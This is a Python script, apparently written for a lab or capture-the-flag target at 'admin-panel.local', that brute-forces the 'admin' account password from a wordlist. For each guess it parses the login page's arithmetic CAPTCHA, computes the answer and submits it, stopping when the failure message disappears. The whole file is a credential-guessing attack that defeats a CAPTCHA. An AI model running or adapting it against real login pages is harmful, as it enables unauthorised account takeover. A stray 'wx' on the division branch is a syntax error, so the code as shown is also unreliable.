from email import header
import sys
import urllib
import requests
from bs4 import BeautifulSoup
import re

site = 'http://admin-panel.local'

with open("../../../usr/share/wordlists/wordlist.txt", 'r') as file: 
    for line in file :
        password = line.strip()

        print(password)

        response = requests.get(site)
        session_cookies = response.cookies
        soup = BeautifulSoup(response.text, "html.parser")

        captcha_input = soup.find('input', {'name': 'captcha'})
        placeholder_text = captcha_input.get('placeholder')
        print("Texte du placeholder :", placeholder_text)

        numbers = re.findall(r'\d+', placeholder_text)
        
        operator = re.search(r'[+\-*/]', placeholder_text).group()
            
        num1 = int(numbers[0])
        num2 = int(numbers[1])
                
        if operator == '+':
            result = num1 + num2
        elif operator == '-':
            result = num1 - num2
        elif operator == '*':
            result = num1 * num2
        elif operator == '/':wx
            result = num1 / num2

        post_data = {
            'username': 'admin',
            'password': password,  
            'captcha': result
        }


        post_response = requests.post(site, data=post_data, cookies=session_cookies)

        # Vérifier la réponse de la requête POST pour déterminer si le mot de passe est correct
        if "Login failure!" not in post_response.text:
            print(f"Mot de passe correct trouvé : {password}")
            print(post_response.text)
            break  # Sortir de la boucle lorsque le mot de passe est trouvé

        

